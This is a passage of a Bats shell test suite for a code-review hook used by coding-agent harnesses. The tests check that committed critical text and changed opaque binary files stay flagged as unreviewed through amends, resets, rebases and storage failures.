      cat > "$B10_D2_TOOLS/git" <<'CAP_GIT'
#!/bin/bash
printf '%s\n' "$*" >> "$B10_D2_STATE/cap-git-calls"
exec "$B10_D2_REAL_GIT" "$@"
CAP_GIT
      for n in 1 2; do
        : > "$B10_D2_STATE/cap-git-calls"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED"))' >/dev/null || return 1
        if [ "$n" -eq 1 ]; then [[ "$output$stderr" == *'opaque debt exceeds 256 paths'* ]] || return 1; fi
        ! grep -q 'ls-tree' "$B10_D2_STATE/cap-git-calls" || return 1
        [ "$(wc -l < "$B10_D2_STATE/cap-git-calls" | tr -d ' ')" -lt 45 ] || return 1
        printf '# B10_OPAQUE_CAP %s/%s/%s git_calls=%s ls_tree=0\n' "$harness" "$kind" "$n" "$(wc -l < "$B10_D2_STATE/cap-git-calls" | tr -d ' ')" >&3
        if [ "$calls_before" -eq 0 ]; then [ ! -e "$B10_D2_STATE/calls" ] || return 1
        else
          [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
          [ "$before" = "$("$B10_D2_REAL_GIT" hash-object "$record")" ] || return 1
        fi
        b10_d2_no_completion || return 1
      done
    done
  done
}

@test "B10 D2 R5 L-d: aggregate opaque debt clears only after a later HEAD with no dirty opaque paths" {
  local harness kind record n
  for harness in claude codex; do
    for kind in dirty precommitted; do
      b10_d2_fixture "$harness" "-aggregate-$kind"
      "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" <<'AGGREGATE_BASE'
from pathlib import Path
import sys
for n in range(300): (Path(sys.argv[1]) / ('b%03d.dat' % n)).write_bytes(b'\0before')
AGGREGATE_BASE
      git -C "$B10_D2_PROJECT" add -- '*.dat'
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm aggregate-baseline
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" <<'AGGREGATE_DIRTY'
from pathlib import Path
import sys
for n in range(300): (Path(sys.argv[1]) / ('b%03d.dat' % n)).write_bytes(b'\0after-EVIL')
AGGREGATE_DIRTY
      if [ "$kind" = precommitted ]; then
        git -C "$B10_D2_PROJECT" add -- '*.dat'
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm before-notice
      fi
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [[ "$output$stderr" == *'opaque debt exceeds 256 paths'* ]] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      printf 'still = 1\n' >> "$B10_D2_PROJECT/alpha.py"
      if [ "$kind" = dirty ]; then
        printf 'unrelated\n' > "$B10_D2_PROJECT/ack.txt"
        git -C "$B10_D2_PROJECT" add ack.txt
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm unrelated-with-dirty-opaque
      fi
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      if [ "$kind" = dirty ]; then
        # Leave only ONE opaque path dirty. Without the whole-tree dirty
        # guard, normal capture would now fit the cap and silently clear the
        # aggregate; keeping all300 dirty would not kill that mutation.
        "$B10_D2_REAL_PYTHON" -I - "$B10_D2_REAL_GIT" "$B10_D2_PROJECT" <<'PARTIAL_ACK'
import subprocess, sys
subprocess.run([sys.argv[1], '-C', sys.argv[2], 'add', '--', *('b%03d.dat' % n for n in range(299))], check=True)
PARTIAL_ACK
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm partial-opaque-acknowledgement
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
        [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
        git -C "$B10_D2_PROJECT" add -- '*.dat'
      else printf 'acknowledge notice\n' > "$B10_D2_PROJECT/ack.txt"; git -C "$B10_D2_PROJECT" add ack.txt; fi
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm after-aggregate-notice
      printf 'after = 1\n' >> "$B10_D2_PROJECT/alpha.py"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
      jq -e '.incomplete == false and .opaque == [] and .reset_hold == false' "$record" >/dev/null || return 1
      jq -e '.excluded_paths == [] and (.diff | contains("after = 1"))' "$B10_D2_STATE/payload" >/dev/null || return 1
      [ ! -e "${record%/*}/unmet.capture.$harness" ] || return 1
    done
  done
}

b10_r9_aggregate_fixture() {
  local harness="$1" kind="$2" f
  b10_d2_fixture "$harness" "-r9-$kind"
  "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" <<'R9_BASE'
from pathlib import Path
import sys
for n in range(300): (Path(sys.argv[1]) / ('b%03d.dat' % n)).write_bytes(b'\0before')
R9_BASE
  printf '\000A' > "$B10_D2_PROJECT/x.dat"
  git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
  git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm r9-baseline
  cat > "$B10_D2_TOOLS/reviewer" <<'R9_REVIEWER'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
if "$B10_D2_REAL_JQ" -e '.diff | contains("+CRITICAL")' "$B10_D2_STATE/payload" >/dev/null; then
  printf '%s\n' '{"status":"completed","findings":[{"severity":"critical","file":"alpha.py","msg":"CRITICAL text"}]}'
else printf '%s\n' '{"status":"completed","findings":[]}'; fi
R9_REVIEWER
  for f in alpha beta gamma; do printf 'reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
  b10_d2_review
  [ "$status" -eq 0 ] || return 1
  if [ "$kind" = changed-entry ]; then
    printf '\000B1' > "$B10_D2_PROJECT/x.dat"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
  fi
  "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" <<'R9_CHANGED'
from pathlib import Path
import sys
for n in range(300): (Path(sys.argv[1]) / ('b%03d.dat' % n)).write_bytes(b'\0aggregate-announced')
R9_CHANGED
  if [ "$kind" = critical ] || [ "$kind" = durability-critical ]; then printf 'CRITICAL = 2\n' >> "$B10_D2_PROJECT/alpha.py"; fi
  b10_d2_review
  [ "$status" -eq 0 ] || return 1
  [[ "$output$stderr" == *'opaque debt exceeds 256 paths'* ]] || return 1
  B10_R9_RECORD=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
  B10_R9_NOTICE="${B10_R9_RECORD%/*}/unmet.capture.$harness"
  B10_R9_COMPLETED="${B10_R9_RECORD%/*}/reviewed.$harness"
  B10_R9_BEFORE=$(cat "$B10_R9_COMPLETED")
  B10_R9_CALLS=$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')
}

@test "B10 D2 R6 H-1: aggregate acknowledgement never skips committed critical text" {
  local harness f
  for harness in claude codex; do
    b10_r9_aggregate_fixture "$harness" critical || return 1
    git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm aggregate-and-critical
    for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1
    else [ "$status" -eq 0 ] || return 1; fi
    printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("CRITICAL"))' >/dev/null || return 1
    jq -e '.diff | contains("+CRITICAL = 2")' "$B10_D2_STATE/payload" >/dev/null || return 1
    [ "$B10_R9_BEFORE" = "$(cat "$B10_R9_COMPLETED")" ] || return 1
    [ -e "$B10_R9_NOTICE" ] || return 1
  done
}

@test "B10 D2 R6 H-1: new binary and critical text added after the aggregate notice are not covered" {
  local harness f
  for harness in claude codex; do
    b10_r9_aggregate_fixture "$harness" new-binary || return 1
    printf '\000EVIL-never-announced' > "$B10_D2_PROJECT/evil.dat"
    printf 'CRITICAL = 1\n' > "$B10_D2_PROJECT/crit.py"
    git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm new-opaque-and-critical
    for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED*evil.dat* || "$output$stderr" == *evil.dat*UNREVIEWED* ]] || return 1
    [ "$B10_R9_BEFORE" = "$(cat "$B10_R9_COMPLETED")" ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$B10_R9_CALLS" ] || return 1
    # A later acknowledgement can retire only that announced binary set;
    # the committed CRITICAL text remains in the original covered-tree diff.
    printf 'ack\n' > "$B10_D2_PROJECT/ack.txt"
    git -C "$B10_D2_PROJECT" add ack.txt
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm acknowledge-new-notice
    b10_d2_review
    printf '%s' "$output" | jq -e '.decision == "block"' >/dev/null || return 1
    jq -e '.diff | contains("+CRITICAL = 1")' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2 R6 H-1: aggregate acknowledgement preserves changed earlier-ledger bytes and their new announcement" {
  local harness f blob head
  for harness in claude codex; do
    b10_r9_aggregate_fixture "$harness" changed-entry || return 1
    printf '\000B2-never-announced' > "$B10_D2_PROJECT/x.dat"
    git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm changed-entry-with-aggregate
    for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED*x.dat* || "$output$stderr" == *x.dat*UNREVIEWED* ]] || return 1
    [ "$B10_R9_BEFORE" = "$(cat "$B10_R9_COMPLETED")" ] || return 1
    printf 'ack\n' > "$B10_D2_PROJECT/ack.txt"
    git -C "$B10_D2_PROJECT" add ack.txt
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm acknowledge-aggregate
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    blob=$(git -C "$B10_D2_PROJECT" hash-object x.dat)
    head=$(git -C "$B10_D2_PROJECT" rev-parse HEAD)
    jq -e --arg blob "$blob" --arg head "$head" '.incomplete == true and any(.opaque[]; .path == "x.dat" and .blob == $blob and .announced_head == $head)' "$B10_R9_RECORD" >/dev/null || return 1
    [ "$B10_R9_BEFORE" = "$(cat "$B10_R9_COMPLETED")" ] || return 1
    [ -e "$B10_R9_NOTICE" ] || return 1
  done
}

@test "B10 D2 R6 L-f: blocked failed and undurable reviews retain aggregate notice until completed coverage" {
  local harness kind f notice_before markers_before
  for harness in claude codex; do
    for kind in critical failure storage; do
      b10_r9_aggregate_fixture "$harness" "durability-$kind" || return 1
      git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm acknowledge-aggregate
      for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
      notice_before=$(git -C "$B10_D2_PROJECT" hash-object "$B10_R9_NOTICE")
      markers_before=$(find "$B10_D2_PROJECT" -name '.review-done-*' -type f | wc -l | tr -d ' ')
      cp "$B10_D2_TOOLS/reviewer" "$B10_D2_TOOLS/reviewer.saved"
      if [ "$kind" = failure ]; then
        cat > "$B10_D2_TOOLS/reviewer" <<'R9_FAILURE'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' 'malformed review'
R9_FAILURE
      elif [ "$kind" = storage ]; then
        export B10_D2_REAL_MV
        B10_D2_REAL_MV=$(command -v mv)
        cat > "$B10_D2_TOOLS/mv" <<'R9_STORAGE'
#!/bin/bash
for last do :; done
case "$last" in */covered.*.json) printf 'coverage publish refused\n' >> "$B10_D2_STATE/storage-refused"; exit 1 ;; esac
exec "$B10_D2_REAL_MV" "$@"
R9_STORAGE
        chmod +x "$B10_D2_TOOLS/mv"
      fi
      b10_d2_review
      [ -e "$B10_R9_NOTICE" ] || return 1
      [ "$notice_before" = "$(git -C "$B10_D2_PROJECT" hash-object "$B10_R9_NOTICE")" ] || return 1
      [ "$(find "$B10_D2_PROJECT" -name '.review-done-*' -type f | wc -l | tr -d ' ')" -eq "$markers_before" ] || return 1
      if [ "$kind" = storage ]; then [ -s "$B10_D2_STATE/storage-refused" ] || return 1; rm -f -- "$B10_D2_TOOLS/mv"; fi
      cp "$B10_D2_TOOLS/reviewer.saved" "$B10_D2_TOOLS/reviewer"
      if [ "$kind" = critical ]; then
        "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT/alpha.py" <<'R9_FIX'
from pathlib import Path
import sys
p = Path(sys.argv[1]); p.write_text(''.join(line for line in p.read_text().splitlines(True) if not line.startswith('CRITICAL')))
R9_FIX
      fi
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ ! -e "$B10_R9_NOTICE" ] || return 1
      jq -e '.incomplete == false and .opaque == []' "$B10_R9_RECORD" >/dev/null || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$((B10_R9_CALLS + 2))" ] || return 1
    done
  done
}

@test "B10 D2 R6 M-1: amend and soft-reset recommit review folded text and announce folded binary" {
  local harness kind f record completed before
  for harness in claude codex; do
    for kind in amend reset squash; do
      b10_d2_fixture "$harness" "-folded-$kind"
      git -C "$B10_D2_PROJECT" add -- '*.py'
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm tracked-baseline
      if [ "$kind" = squash ]; then git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --allow-empty -qm squash-parent; fi
      for f in alpha beta gamma; do printf 'reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      completed="${record%/*}/reviewed.$harness"
      before=$(cat "$completed")
      printf 'CRITICAL = 3\n' > "$B10_D2_PROJECT/crit.py"
      printf '\000EVIL-folded' > "$B10_D2_PROJECT/evil.dat"
      git -C "$B10_D2_PROJECT" add -- '*.py' '*.dat'
      if [ "$kind" = amend ]; then
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend -qm folded-content
      else
        if [ "$kind" = squash ]; then git -C "$B10_D2_PROJECT" reset --soft HEAD~2
        else git -C "$B10_D2_PROJECT" reset --soft HEAD~1; fi
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm folded-content
      fi
      for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      jq -e '.diff | contains("+CRITICAL = 3")' "$B10_D2_STATE/payload" >/dev/null || return 1
      jq -e '.excluded_paths | index("evil.dat") != null' "$B10_D2_STATE/payload" >/dev/null || return 1
      [ "$before" = "$(cat "$completed")" ] || return 1
      jq -e '.incomplete == true and any(.opaque[]; .path == "evil.dat")' "$record" >/dev/null || return 1
    done
  done
}

@test "B10 D2 R6 M-1: a lost coverage tree is one incomplete Stop then a clean HEAD recapture" {
  local harness record tmp completed before calls_before
  for harness in claude codex; do
    b10_d2_fixture "$harness" -base-lost
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    completed="${record%/*}/reviewed.$harness"; before=$(cat "$completed")
    tmp="$record.tmp"
    jq '.tree = "0123456789012345678901234567890123456789"' "$record" > "$tmp"; mv "$tmp" "$record"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    printf '%s' "$output" | jq -se '.[0] | (.additionalContext // .systemMessage) | contains("coverage base lost") and contains("UNREVIEWED")' >/dev/null || return 1
    [ "$before" = "$(cat "$completed")" ] || return 1
    jq -e '.incomplete == true and .coverage_base_lost == true' "$record" >/dev/null || return 1
    calls_before=$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.incomplete == false and .coverage_base_lost == false' "$record" >/dev/null || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$calls_before" ] || return 1
  done
}

@test "B10 D2 R6 L-g: baseline reversion cannot retire a path still differing from current HEAD" {
  local harness record before completed
  for harness in claude codex; do
    b10_d2_fixture "$harness" -reversion-vs-head
    printf '\000A' > "$B10_D2_PROJECT/x.dat"
    git -C "$B10_D2_PROJECT" add x.dat
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm baseline-A
    printf '\000B' > "$B10_D2_PROJECT/x.dat"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    # Move HEAD to C, but keep A (the old covered baseline) dirty in the
    # worktree. It is NOT a reversion to what current HEAD actually contains.
    printf '\000C' > "$B10_D2_PROJECT/x.dat"
    git -C "$B10_D2_PROJECT" add x.dat
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm HEAD-C
    printf '\000A' > "$B10_D2_PROJECT/x.dat"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.incomplete == true and any(.opaque[]; .path == "x.dat")' "$record" >/dev/null || return 1
    [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2 R6 L-g: aggregate cannot clear while earlier opaque debt is dirty as text" {
  local harness f
  for harness in claude codex; do
    b10_r9_aggregate_fixture "$harness" changed-entry || return 1
    git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm announced-set
    printf 'x.dat diff\n' > "$B10_D2_PROJECT/.git/info/attributes"
    printf 'now_text = 1\n' > "$B10_D2_PROJECT/x.dat"
    for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$B10_R9_CALLS" ] || return 1
    jq -e '.opaque | any(.path == "x.dat")' "$B10_R9_RECORD" >/dev/null || return 1
    [ "$B10_R9_BEFORE" = "$(cat "$B10_R9_COMPLETED")" ] || return 1
  done
}

@test "B10 D2 R6 L-g: aggregate cannot acknowledge binaries during a coverage reset Stop" {
  local harness f tmp
  for harness in claude codex; do
    b10_r9_aggregate_fixture "$harness" reset-clause || return 1
    git -C "$B10_D2_PROJECT" add -- '*.dat' '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm announced-set
    for f in alpha beta gamma; do printf 'later = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    tmp="$B10_R9_RECORD.tmp"
    jq '.reviewed_files = null' "$B10_R9_RECORD" > "$tmp"; mv "$tmp" "$B10_R9_RECORD"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [[ "$output$stderr" == *UNREVIEWED* ]] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$B10_R9_CALLS" ] || return 1
    [ "$B10_R9_BEFORE" = "$(cat "$B10_R9_COMPLETED")" ] || return 1
    [ -e "$B10_R9_NOTICE" ] || return 1
  done
}

b10_r10_critical_reviewer() {
  cat > "$B10_D2_TOOLS/reviewer" <<'R10_CRITICAL'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
if "$B10_D2_REAL_JQ" -e '.diff | contains("+CRITICAL")' "$B10_D2_STATE/payload" >/dev/null; then
  printf '%s\n' '{"status":"completed","findings":[{"severity":"critical","file":"source.py","msg":"CRITICAL text"}]}'
else printf '%s\n' '{"status":"completed","findings":[]}'; fi
R10_CRITICAL
}

@test "B10 D2 R7 M-1: copied branch content is reviewed while switch and rebase upstream content is not attributed" {
  local harness kind size f old_branch record calls_before n
  for harness in claude codex; do
    for kind in copied switch rebase; do
      for size in small large; do
        [ "$kind/$size" != copied/large ] || continue
        b10_d2_fixture "$harness" "-r10-$kind-$size"
        b10_r10_critical_reviewer
        old_branch=$(git -C "$B10_D2_PROJECT" symbolic-ref --short HEAD)
        if [ "$kind" = copied ]; then
          printf 'CRITICAL_LEGACY = 1\n' > "$B10_D2_PROJECT/legacy.py"
          printf '\000legacy' > "$B10_D2_PROJECT/blob.dat"
        fi
        git -C "$B10_D2_PROJECT" add -- '*.py'
        if [ "$kind" = copied ]; then git -C "$B10_D2_PROJECT" add blob.dat; fi
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm base
        if [ "$kind" != copied ]; then
          git -C "$B10_D2_PROJECT" checkout -qb upstream
          printf 'CRITICAL_UPSTREAM = 1\n' > "$B10_D2_PROJECT/up_crit.py"
          if [ "$size" = large ]; then
            "$B10_D2_REAL_PYTHON" -I -c 'import pathlib,sys; pathlib.Path(sys.argv[1]).write_text("upstream = 12345678901234567890\n" * 12000)' "$B10_D2_PROJECT/upstream_data.py"
          fi
          git -C "$B10_D2_PROJECT" add -- '*.py'
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm upstream
          git -C "$B10_D2_PROJECT" checkout -q "$old_branch"
        fi
        for n in 1 2 3; do
          printf '%s\n' "$n" > "$B10_D2_PROJECT/history.txt"
          git -C "$B10_D2_PROJECT" add history.txt
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm "local-$n"
        done
        for f in alpha beta gamma; do printf 'first_reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
        if [ "$kind" = copied ]; then
          git -C "$B10_D2_PROJECT" checkout --orphan other >/dev/null 2>&1
          git -C "$B10_D2_PROJECT" rm -qrf -- .
          for f in alpha beta gamma; do printf 'safe = 1\n' > "$B10_D2_PROJECT/$f.py"; done
          git -C "$B10_D2_PROJECT" add -- '*.py'
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm unrelated-root
          git -C "$B10_D2_PROJECT" checkout "$old_branch" -- legacy.py blob.dat
        elif [ "$kind" = switch ]; then git -C "$B10_D2_PROJECT" checkout -q upstream
        else
          git -C "$B10_D2_PROJECT" add -- alpha.py beta.py gamma.py
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm reviewed-before-rebase
          GIT_COMMITTER_DATE='2030-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com rebase --force-rebase upstream >/dev/null 2>&1
        fi
        calls_before=$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')
        for f in alpha beta gamma; do printf 'agent = 2\n' >> "$B10_D2_PROJECT/$f.py"; done
        b10_d2_review
        if [ "$kind" = copied ]; then
          if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1; else [ "$status" -eq 0 ] || return 1; fi
          printf '%s' "$output" | jq -e '.decision == "block"' >/dev/null || return 1
          jq -e '(.diff | contains("+CRITICAL_LEGACY")) and (.excluded_paths | index("blob.dat") != null)' "$B10_D2_STATE/payload" >/dev/null || return 1
        else
          [ "$status" -eq 0 ] || return 1
          [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$((calls_before + 1))" ] || return 1
          jq -e '.diff | (contains("+agent = 2")) and (contains("up_crit.py") | not) and (contains("upstream_data.py") | not)' "$B10_D2_STATE/payload" >/dev/null || return 1
          jq -e '.incomplete == true and .coverage_base_lost == true' "$record" >/dev/null || return 1
          [[ "$output$stderr" == *'coverage base lost'* ]] || return 1
          b10_d2_review
          [ "$status" -eq 0 ] || return 1
          [[ "$output$stderr" != *'coverage base lost'* ]] || return 1
          jq -e '.incomplete == false' "$record" >/dev/null || return 1
          # The larger-than200KB non-merge upstream must remain completable
          # after subsequent commits, not stay pinned to the old branch tree.
          git -C "$B10_D2_PROJECT" add -- alpha.py beta.py gamma.py
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm reviewed-agent
          for f in alpha beta gamma; do printf 'next = 3\n' >> "$B10_D2_PROJECT/$f.py"; done
          b10_d2_review
          [ "$status" -eq 0 ] || return 1
          jq -e '.incomplete == false' "$record" >/dev/null || return 1
        fi
      done
    done
  done
}

@test "B10 D2 R7 L-h: malformed coverage cannot reuse L3 text as an L4 decision-review base" {
  local harness f record tmp
  for harness in claude codex; do
    b10_d2_fixture "$harness" -r10-context
    for f in alpha beta gamma; do printf 'first_reviewed = 1\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    tmp="$record.tmp"; jq '.reviewed_files = null' "$record" > "$tmp"; mv "$tmp" "$record"
    mkdir -p "$B10_D2_PROJECT/.claude"
    printf '4\n' > "$B10_D2_PROJECT/.claude/session-autonomy"
    printf 'next = 2\n' >> "$B10_D2_PROJECT/alpha.py"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.autonomy_level == 4 and ([.diff | scan("\\+first_reviewed")] | length) == 3' "$B10_D2_STATE/payload" >/dev/null || return 1
  done
}

@test "B10 D2 R7 L-h: schema2 upgrade reconstructs dirty binary debt rather than using an invalid tree base" {
  local harness record capture tmp n
  for harness in claude codex; do
    b10_d2_fixture "$harness" -r10-schema2
    printf '\000safe' > "$B10_D2_PROJECT/t.dat"
    git -C "$B10_D2_PROJECT" add t.dat
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm binary-baseline
    printf '\000EVIL-dirty' > "$B10_D2_PROJECT/t.dat"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    capture="${record%/*}/capture.$harness.json"
    tmp="$record.tmp"
    jq '.schema_version = 2 | .contract = "capture-v4:L3" | del(.opaque, .reset_hold, .coverage_reset, .coverage_base_lost)' "$record" > "$tmp"
    cp "$tmp" "$record"; mv "$tmp" "$capture"
    for n in 1 2; do
      printf 'next = %s\n' "$n" >> "$B10_D2_PROJECT/alpha.py"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      jq -e '.incomplete == true and any(.opaque[]; .path == "t.dat")' "$record" >/dev/null || return 1
      [[ "$output$stderr" == *t.dat*UNREVIEWED* || "$output$stderr" == *UNREVIEWED*t.dat* ]] || return 1
      b10_d2_no_completion || return 1
    done
  done
}

@test "B10 D2 R7 L-i: refused coverage publication leaves completion unchanged and later committed critical text visible" {
  local harness f record completed before markers_before
  for harness in claude codex; do
    b10_d2_fixture "$harness" -r10-publish-order
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    completed="${record%/*}/reviewed.$harness"; before=$(cat "$completed")
    markers_before=$(find "$B10_D2_PROJECT" -name '.review-done-*' -type f | wc -l | tr -d ' ')
    git -C "$B10_D2_PROJECT" add -- '*.py'
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm previously-reviewed
    for f in alpha beta gamma; do printf 'second_review = 2\n' >> "$B10_D2_PROJECT/$f.py"; done
    export B10_D2_REAL_MV
    B10_D2_REAL_MV=$(command -v mv)
    cat > "$B10_D2_TOOLS/mv" <<'R10_REFUSE_COVERAGE'
#!/bin/bash
for last do :; done
case "$last" in */covered.*.json) printf 'coverage refused\n' >> "$B10_D2_STATE/refused"; exit 1 ;; esac
exec "$B10_D2_REAL_MV" "$@"
R10_REFUSE_COVERAGE
    chmod +x "$B10_D2_TOOLS/mv"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ -s "$B10_D2_STATE/refused" ] || return 1
    [ "$before" = "$(cat "$completed")" ] || return 1
    [ "$(find "$B10_D2_PROJECT" -name '.review-done-*' -type f | wc -l | tr -d ' ')" -eq "$markers_before" ] || return 1
    [[ "$output$stderr" == *'completion record unchanged'* ]] || return 1
    rm -f -- "$B10_D2_TOOLS/mv"
    b10_r10_critical_reviewer
    printf 'CRITICAL = 5\n' > "$B10_D2_PROJECT/crit.py"
    git -C "$B10_D2_PROJECT" add crit.py
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm committed-after-storage-failure
    for f in alpha beta gamma; do printf 'later = 3\n' >> "$B10_D2_PROJECT/$f.py"; done
    b10_d2_review
    if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1; else [ "$status" -eq 0 ] || return 1; fi
    printf '%s' "$output" | jq -e '.decision == "block"' >/dev/null || return 1
